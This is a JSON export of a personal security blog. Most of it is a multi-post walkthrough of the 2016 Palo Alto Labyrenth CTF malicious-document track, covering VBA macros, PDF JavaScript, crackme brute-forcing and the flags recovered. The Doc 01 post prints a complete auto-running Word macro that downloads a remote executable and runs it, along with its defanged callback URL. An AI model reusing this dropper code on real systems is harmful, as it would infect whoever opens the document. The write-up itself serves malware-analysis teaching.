Dim a2 As String: a2 = mod1.toString(tmp3) Dim a3 As String: a3 = mod1.toString(mod1.fnToBase64Ary(StrReverse(frm2.Tag))) If mod1.fnIsB64Identicals(tmp3, mod1.fnToBase64Ary(StrReverse(frm2.Tag))) Then MsgBox a2 End IfEnd SubSub test() b64 = Split(&quot;A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,+,/&quot;, &quot;,&quot;) customKey = &quot;yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5&quot; Dim tmp() As Byte Dim strBase As String: strBase = &quot;XJCR/DogZt7bduvvusJgAQu6QX9DmtKN+bZB&quot; fnB64Arry = mod1.fnToBase64Ary(strBase) Dim tmp1() As Byte tmp1 = mod1.fnSimpleXor(fnB64Arry, frm2.ScrollWidth) Dim tmp2() As Byte tmp2 = mod1.fnSimpleXor_wrapper(frm2.Zoom, tmp1) Dim tmp3() As Byte tmp3 = mod1.fnCustomXor(tmp2, fnToBase64Ary(customKey)) MsgBox mod1.toString(tmp3)End Sub The test subroutine is something that I put in to get the key out, but I figured all the parts and peices by going through each function and figuring out what they do, where it was pulling values from and what the values were in some cases. The only suggestion I have is get good at debugging! After that I noticed an oddity in this fnCheck function (orginally it was named XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM) - it would do a check and then show a message box. Hmm, I wonder what the value would have to be in order to have the message box show? Well since I had just done a brute force exercise a few minutes eairler (see DOC 02) I started using the brute force routine to get out the expected value….but after a few minutes it hit me…wait I have the exact value its looking for… the value of ‘frm2.Tag’ so we take that value:1BZb+NKtmD9XQ6uQAgJsuvvudb7tZgoD/RCJX reverse it and run it through and we get:1PAN&#123;VBA=V3ryb!gAdv3n7ur3s!&#125; type it in the submission box BOOM and we get DOC 05","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}],"keywords":[]},{"title":"2016 Palo Alto Labyrenth CTF Doc 03","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-03","date":"2016-08-15T14:41:16.000Z","updated":"2016-08-16T19:55:07.946Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/","excerpt":"","text":"DOC 01 DOC 02 DOC 03 &lt;- You are here DOC 04 DOC 05 So we get the third zip file which contains file named “gooby.pdf” (hash:3FB332A27A28AF95187F45D79EC8A08ADEF1A4AAD0D4DDD26B832A15CE9DB91A). Well now we need to turn to PDF tools. I admit that I’m not as well versed with the internal structures of PDF’s as I am with Office Documents, but their structure is also simplier. So I first tried PDFStreamDumper by David Zimmer, but it didn’t see the javascript intially. Then I tried peepdf, but again it didn’t get what I needed intially, then I tried the interactive mode and ignoring errors flags:1python peepdf.py -f -l -i goody.pdf So peepdf loads the file, and shows some “stuff”:12345678910111213141516171819202122232425262728File: gooby.pdfMD5: 92b562e12560591699e37b6c2533c191SHA1: ca2250317e4d07a6096282035275256896bcdb2eSHA256: f575fc6580c192088d60bed8be1791eaa7e5c625331d7c67683f5efb59551247Size: 119412 bytesVersion: 1.7Binary: TrueLinearized: FalseEncrypted: FalseUpdates: 0Objects: 11Streams: 7URIs: 0Comments: 0Errors: 3Version 0: Catalog: 2 Info: 4 Objects (11): [6, 8, 9, 10, 11, 12, 13, 14, 15] Streams (7): [11, 12, 13, 14, 15, 9, 12] Xref streams (1): [15] Encoded (7): [11, 12, 13, 14, 15, 9, 12] Objects with JS code (1): [11] Suspicious elements: /AA (1): [6] /JS (1): [11] /JavaScript (1): [11] so based on this output it looks like object #11 has some javascript, so I type:1object 11 and get:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283var asdf = &quot;NuemnaufOmt8wek4obWeashiMeivanJeatt6&quot;;var ddas = &quot;bodcuicMong2&quot;;var dda22d = &quot;bosOjparj1&quot;var obGeujRiary = &quot;akPatMyib5EbJetEteip9idWoncainil7&quot;function Iadghod3(s) &#123; var v = 0; for (var i=0; i&lt;4; i++) v |= s.charCodeAt(i) &lt;&lt; i*8; return isNaN(v) ? 0 : v;&#125;function Vonsheac6(v) &#123; var s = String.fromCharCode(v &amp; 0xFF, v&gt;&gt;8 &amp; 0xFF, v&gt;&gt;16 &amp; 0xFF, v&gt;&gt;24 &amp; 0xFF); return s;&#125;function RevUfPhas2(DepKacyuv7, ClashJit0) &#123; var v = new Array(2), k = new Array(4), s = &quot;&quot;, i; DepKacyuv7 = escape(DepKacyuv7); for (var i=0; i&lt;4; i++) k[i] = Iadghod3(ClashJit0.slice(i*4,(i+1)*4)); for (i=0; i&lt;DepKacyuv7.length; i+=8) &#123; v[0] = Iadghod3(DepKacyuv7.slice(i,i+4)); v[1] = Iadghod3(DepKacyuv7.slice(i+4,i+8)); DikVivec2(v, k); s += Vonsheac6(v[0]) + Vonsheac6(v[1]); &#125; return s;&#125;function jiUteFraj8(tydAcFod3, ClashJit0) &#123; var v = new Array(2), k = new Array(4), s = &quot;&quot;, i; for (var i=0; i&lt;4; i++) k[i] = Iadghod3(ClashJit0.slice(i*4,(i+1)*4)); tydAcFod3 = tydAcFod3; for (i=0; i&lt;tydAcFod3.length; i+=8) &#123; v[0] = Iadghod3(tydAcFod3.slice(i,i+4)); v[1] = Iadghod3(tydAcFod3.slice(i+4,i+8)); AdCejMod9(v, k); s += Vonsheac6(v[0]) + Vonsheac6(v[1]); &#125; s = s.replace(/ +$/, &apos;&apos;); return unescape(s);&#125;function DikVivec2(v, k) &#123; var y = v[0], z = v[1]; var delta = 0x9E3779B9, limit = delta*32, sum = 0; while (sum != limit) &#123; y += (z&lt;&lt;4 ^ z&gt;&gt;&gt;5)+z ^ sum+k[sum &amp; 3]; sum += delta; z += (y&lt;&lt;4 ^ y&gt;&gt;&gt;5)+y ^ sum+k[sum&gt;&gt;&gt;11 &amp; 3]; &#125; v[0] = y; v[1] = z;&#125;function AdCejMod9(v, k) &#123; var y = v[0], z = v[1]; var delta = 0x9E3779B9, sum = delta*32; while (sum != 0) &#123; z -= (y&lt;&lt;4 ^ y&gt;&gt;&gt;5)+y ^ sum+k[sum&gt;&gt;&gt;11 &amp; 3]; sum -= delta; y -= (z&lt;&lt;4 ^ z&gt;&gt;&gt;5)+z ^ sum+k[sum &amp; 3]; &#125; v[0] = y; v[1] = z;&#125;var atkopNersiv4 = RevUfPhas2(asdf, ddas);var fakCapFod9 = jiUteFraj8(ddas, obGeujRiary)var arnUftad4 = 0x41;ItOvyof7 = &quot;)5512&#123;nn666o8.454#$o\\&quot;.,n6 5\\&quot;)~7|%\\x106u6x\\x16&amp;\\x19\\&quot;\\x10&quot;;var plain = &quot;&quot;;for (i = 0; i &lt; ItOvyof7.length; i+=1)&#123; plain += String.fromCharCode(ItOvyof7.charCodeAt(i) ^ arnUftad4);&#125; so I fired up NodeJS and blindly run the javascript (tee hee hee). Of course nothing actually happens, but we can examine some varaibles…and the last variable output to the screen plain is a url: https://www.youtube.com/watch?v=dQw4w9WgXcQ which is a nice RickRoll. But lets look at what are the values of the other variables, in a nodeJS REPL we simply type: GLOBAL and we get (relevant only):1234567891011121314151617181920&#123; ... asdf: &apos;NuemnaufOmt8wek4obWeashiMeivanJeatt6&apos;, ddas: &apos;bodcuicMong2&apos;, dda22d: &apos;bosOjparj1&apos;, obGeujRiary: &apos;akPatMyib5EbJetEteip9idWoncainil7&apos;, Iadghod3: [Function: Iadghod3], Vonsheac6: [Function: Vonsheac6], RevUfPhas2: [Function: RevUfPhas2], jiUteFraj8: [Function: jiUteFraj8], DikVivec2: [Function: DikVivec2], AdCejMod9: [Function: AdCejMod9], atkopNersiv4: &apos;\\u000bF©&gt;\\u0013ä)bï#Í×¾?ÝR¯&quot;¸¨Ã\\u0018=\\u000fÞ\\u0006Ô*|o-DX5¨&apos;, fakCapFod9: &apos;Z\\nùW\\u0006\\u001c·såå­\\u0017IC2&apos;, arnUftad4: 65, ItOvyof7: &apos;)5512&#123;nn666o8.454#$o&quot;.,n6 5&quot;)~7|%\\u00106u6x\\u0016&amp;\\u0019&quot;\\u0010&apos;, plain: &apos;https://www.youtube.com/watch?v=dQw4w9WgXcQ&apos;, i: 43 &#125; hmmm…well if we look at the code the variables atkopNersiv4 and fakCapFod9 are not used in that final plain text RickRoll, neither is dda22d, so lets play with those for a bit….ok that’s enough of that…this didn’t go anywhere. At this point I started to look at the parsing errors that the various tools had and trying to figure out why they weren’t parsing well. Instead of digging too deep here, I decided to see what happens if I round trip the pdf. I open in the Acrobat Reader DC, and save it out as a new file…then I run those existing tools and notice an interesting object:1234&lt;&lt; /Type /Action/S /JavaScript/JS ■ i f ( e v e n t . v a l u e = = &quot; P A N &#123; g 0 o b y g o 0 b y d 0 0 w h 3 r 3 r u ? &#125; &quot; ) &#123; a p p . a l e r t ( &quot; y e s &quot; ) ; &#125; e l s e &#123; a p p . a l e r t ( &quot; n o &quot; ) ; &#125; &gt;&gt; well look at that, a PAN{*} value:1PAN&#123;g0obygo0byd00wh3r3ru?&#125; enter it in and BOOM we get document #4","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}],"keywords":[]},{"title":"2016 Palo Alto Labyrenth CTF Doc 02","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-02","date":"2016-08-15T13:33:34.000Z","updated":"2016-08-16T19:55:07.946Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/","excerpt":"","text":"DOC 01 DOC 02 &lt;- You are here DOC 03 DOC 04 DOC 05 So we solved the frist document and then they give us this…Document #2 (hash: ACCDF64EB1E96BE5A7C5F23DB6A74B88869E4F6C3B46D41F80B3063BF79AD05E) So again, run it through FileId tool and get the VBA code out (using the XML or JSON output options). 12345678Sub AutoOpen()&apos;&apos; crackme Macro&apos;&apos; UserForm1.ShowEnd Sub and12345678910111213141516171819202122232425262728293031323334353637383940414243Private Sub button_Click() x = suchcrypto(key.Text, &quot;General Vidal&quot;) If x = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; Then MsgBox &quot;Wow. Good Job! Such crack.&quot; Else MsgBox &quot;U can do. Try harder...&quot; End IfEnd SubFunction suchcrypto(sMessage, strKey) Dim kLen, x, y, i, j, temp Dim s(256), k(256) kLen = Len(strKey) For i = 0 To 255 s(i) = i k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) Next j = 0 For i = 0 To 255 j = (j + k(i) + s(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp Next x = 0 y = 0 For i = 1 To 3072 x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp Next For i = 1 To Len(sMessage) x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp suchcrypto = suchcrypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot; NextEnd Function ok, so we show a form, get user input and then run the “button_Click“ subroutine…but look, we know what the answer should be when we read the IF statement. So basic algebra here…we know one of the two inputs, we have the function, and we know the output….we can brute force… ugh, brute forcing…and in VBA…ok if I have to…sigh. In retrospect, I can think of several other ways to attack this “crypto” other than brute forcing, but that’s what I did in the moment.12345678910Sub BruteEnForcer() ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; k = &quot;General Vidal&quot; msg = &quot;&quot; Do Loop Until suchcrypto(msg, k) = ansEnd Sub ok, so now we have a simple logic/programming problem. We know what the result will be, but how can we figure out what the msg variable should be. How do we know when we are even close…are we going to iterate over all possible typable strings until we find a match? No, well we could, but no just no. You’ll notice there are a bunch of comma’s in the ‘answer’ string and based on the ‘decyption’ code it appends a comma after iterating over each letter in the message. So lets make that answer an array and go character by character until we get matches. I’m also going to limit it to alphanumeric characters, unless that doesn’t work. I would post by brute forcing code that I used, but I didn’t save it…so here’s some code that might work:123456789101112131415161718192021Sub BruteEnForcer() ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; k = &quot;General Vidal&quot; ansArry = Split(ans, &quot;,&quot;) msg = &quot;&quot; leng = 1 Do For i = 32 To 126 tmpMsg = msg + Chr(i) tmp = Split(suchcrypto(tmpMsg, k), &quot;,&quot;) If tmp(leng) = ansArry(leng) Then msg = tmpMsg leng = leng + 1 Exit For End If Next i Loop Until suchcrypto(msg, k) = ans MsgBox msgEnd Sub which when run gives us the following output:1PAN&#123;L4$t_Night_@f@iry_Vizited_M3&#125; gee that looks like it might be it… BOOM and we move on to doc #3","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}],"keywords":[]},{"title":"2016 Palo Alto Labyrenth CTF - Doc 01","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-01","date":"2016-08-15T08:52:00.000Z","updated":"2016-08-16T19:55:07.946Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/","excerpt":"","text":"On 2016-07-15 at 5pm EST Palo Alto Networks started a Capture the Flag competition with cash prizes called PAN Labyrenth CTF. When I looked at the challenges I noticed that there was a Documents track, and since there was a cash prize to the frist person to complete a given track I thought I’d give it a go..hey $1000 for a few hours is not bad. It only took me a few hours (actually more than I intended because I got stuck overthinking one of the problems), but I don’t think I was the first one to complete the track. Regardless, I thought I’d share the steps I went through to solve each of the challenges. DOC 01 &lt;- You are here DOC 02 DOC 03 DOC 04 DOC 05 So to get starting running the CTF you need the initial code for the DOCs track which is found on the getting started page…it was PAN{DOCS_START}. Upon entering this you are given a zip file to download (hash: 846CBD76B491FD6F74212A4259FE933A0FEBF3E5EA93D24A91241EDCD98D5EDC). This file contains two items, one the first document named challenge.doc (hash:9BBEDADF4A5A9CC75DDA5F4CCE7416BEDD1B2221BF80BF6C3CC73DFEE9A337CD), and the second is a file simply named “.7z” (hash:B588AAC998556D1F853AD8C3D4D428CEB26B7D38CFD073CC77C82F4C6EF4FA97). We’ll come back to this file in a little bit (as it is a shortcut), but let start with the other file “”. So what do you do first? Open the file in word? Are you a n00b or insane? probably a little of both…if you’re going to go this route, please make sure that you’re doing it on a machine you can easily clean and have some sort of network monitoring turned on….or a sandbox of somesort. So you can just open it if you trust the document or know what you’re doing…but don’t trust it, are you even sure its actually a document? You need a tool to determine as much as you can without running it…this is static analysis. Personal I lean on tools that I’ve written, but there are lots of great tools out there and I’m not trying to steer you away or towards any particular tool…I’m just showing you what I did. So we run it through my FileId tool and get the VBA code out (using the XML or JSON output options). You could also use many other tools, for example: OleTools by Philippe Lagadec, or OleDump by Didier Stevens. In the end you get this code:123456789101112131415161718192021222324252627282930313233343536373839404142434445Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer) Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA vSHOfSrEta = ActiveDocument.Variables(&quot;ppKzr&quot;).Value() gsFEVmmIzO = &quot;&quot; dHLdiEqdts = 1 While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2 eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta) gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1))) dHLdiEqdts = dHLdiEqdts + 1 Wend QklkhFEQNB = gsFEVmmIzOEnd FunctionPublic Function BkAIuNwQNDkohBY() twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _ 78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _ 12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _ 9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _ 2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _ 30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _ 62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _ 1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24) UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188) Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0)) Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176)) xHttp.Open UkIWIEtqCF, twOvwCSTPL, False xHttp.Send With bStrm .Type = 1 .Open .write xHttp.responseBody .savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2 End With Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))End FunctionPrivate Sub Document_Open() If ActiveDocument.Variables(&quot;ppKzr&quot;).Value &lt;&gt; &quot;toto&quot; Then BkAIuNwQNDkohBY ActiveDocument.Variables(&quot;ppKzr&quot;).Value = &quot;toto&quot; If ActiveDocument.ReadOnly = False Then ActiveDocument.Save End If End IfEnd Sub Looking at this code I can see a couple of things that stand out: the QklkhFEQNB function is the string deobfuscation function. You can tell this by its frequency of use and its always called before the string is needed (look for CreateObject) it does have an autorun functionality (i.e. “Document_Open”), so if we had opened the file and ran the macros it would have done its business What is its business, well without too much digging we can see that it has a variable named xHttp and xStrm in the BkAIuNwQNDkohBY function and we can see that there is a Shell command. Often variable names are also obfuscated in malicious documents so the fact that they aren’t kind of stands out. So it downloads something, saves it to disk, and executes it. So first things first we want to see to where it calls home. To accomplish this we have the deobfuscation function in VBA, so lets open M$Word, create a new document, open up the VBA Editor and drop it in. If you do this you will see that it won’t quite work that simply. If you look carefully at the deobfuscation function you’ll notice it references a document variable:1ActiveDocument.Variables(&quot;ppKzr&quot;).Value() and in the Document_Open subroutine it references this same variable and sets it to “toto”. Knee-jerk reaction replace that with the static string “toto”….nope won’t work, remember the way the code is written it must NOT be “toto” at first. So we have a couple of options at this point: We can brute force the value for the “ppKzr” variable We can try to look up the value We can just run it though a sandbox, or something monitoring the network traffic involved At this point I honestly went with option #3 (but we’ll come back to the other two options in other documents in this CTF track)…it was easy and quick. In the end we have this URL that it tries to call home to (defanged):1hXXp://&#123;REDACTED RFC1918 IPv4&#125;/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.executes well that IP doesn’t help us, its a RFC1918 (or via Wikipedia) private block…but hmmm, that blob in the middle looks base64 encoded…and it even says “b64” but it also has a 0x58 before the blob…we’ll come back to that. So you run the “MDgx…jU=” string through your base64 decoder of choice (I used powershell): 12$s1 = &quot;MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=&quot;[Convert]::FromBase64String($s1) You run the above and you’ll get an error immediate error:12Exception calling &quot;FromBase64String&quot; with &quot;1&quot; argument(s): &quot;The input is not a valid Base-64 string as it contains a non-base 64character, more than two padding characters, or an illegal character among the padding characters. &quot; Not a valid base64 string?? hmmm…lets look at that string again…wait there’s a “\\n” in that string….ok so we can either take it out or make sure powershell properly escapes it…just change “\\n” to “`n” as this is how powershell escapes stuff. So we run it through the base64 decoding function again and it works…but its just a bunch of bytes…but wait there all in a small range. Taking a guess that its an ASCII string I’ll run this powershell command:1[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s1)) boom and I get a string (shortened for brevity):1081916230e3102313a696b07683634216...68071336682f072f306b2a6b6a3468683325 well that isn’t very interesting, but I think I’m stil on the right track. Now I need to go back to the 0x58…hmmm…I wonder if this an XOR string and perhaps the 0x58 is the key. How would I check this? I’ll turn to another tool DataConverter by Kahu Security (of course there are other tools…) So I put our string in and mark it as Hex format (looks hex to me), and enter our hex key 0x58 and we get (key is REDACTED for you pleasure):1PAN&#123;_REDACTED_&#125; huh…PAN{blahblahblah} that looks like the key we entered to get this started…lets try it out… POOF …it works and we get doc02","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}],"keywords":[]},{"title":"Stuff and things yet to do","slug":"Stuff-and-things-yet-to-do","date":"2016-08-13T14:08:12.000Z","updated":"2016-08-13T19:04:35.113Z","comments":true,"path":"2016/08/13/Stuff-and-things-yet-to-do/","link":"","permalink":"https://dbheise.github.io/2016/08/13/Stuff-and-things-yet-to-do/","excerpt":"","text":"so one of the things this blog is going to try to accomplish is collect all the various items that I’ve put on various places in the web. This means old school projects/papers/writings/thoughts as well as linking to &amp; copying of content that I’ve produced that lives elsewhere on the web. We’ll see how it goes…","categories":[],"tags":[{"name":"halfthoughts","slug":"halfthoughts","permalink":"https://dbheise.github.io/tags/halfthoughts/"}],"keywords":[]},{"title":"first","slug":"first","date":"2016-08-13T13:29:53.000Z","updated":"2016-08-13T17:30:59.549Z","comments":true,"path":"2016/08/13/first/","link":"","permalink":"https://dbheise.github.io/2016/08/13/first/","excerpt":"","text":"so i’m trying to start to blog again…not because I want to talk, but because I want one consistant place to put everything… we’ll see how it goes!","categories":[],"tags":[{"name":"obligitory","slug":"obligitory","permalink":"https://dbheise.github.io/tags/obligitory/"}],"keywords":[]}]}